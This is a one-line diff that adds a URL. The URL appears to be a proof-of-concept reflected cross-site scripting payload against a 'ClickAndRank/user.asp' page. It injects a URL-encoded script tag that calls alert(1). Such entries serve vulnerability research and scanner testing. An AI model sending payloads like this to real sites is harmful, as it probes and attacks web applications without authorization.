@@ -1,0 +1,1 @@
+http://www.example.com/index.html?ClickAndRank/user.asp?action=%22%3E%3Cscript%3Ealert(1);%3C/script%3E
